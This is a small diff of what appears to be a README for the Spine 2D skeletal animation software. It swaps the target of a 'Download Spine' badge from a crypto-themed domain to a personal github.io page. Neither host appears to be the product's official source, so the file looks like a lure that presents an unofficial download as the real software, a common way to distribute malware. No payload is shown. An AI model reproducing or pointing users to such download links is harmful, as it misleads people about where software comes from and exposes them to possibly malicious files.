@@ -2,7 +2,7 @@
 
 Spine specializes in 2D skeletal animation for games—skins, meshes, IK, and runtimes for popular engines.
 
-[![Download Spine (2D skeletal animation)](https://img.shields.io/badge/Download-Spine_(2D_skeletal_animation)-blueviolet)](https://cryptoenthusiasts.world/)
+[![Download Spine (2D skeletal animation)](https://img.shields.io/badge/Download-Spine_(2D_skeletal_animation)-blueviolet)](https://nataliepatellis3.github.io/.github/Spine-2D)
 
 ---
 
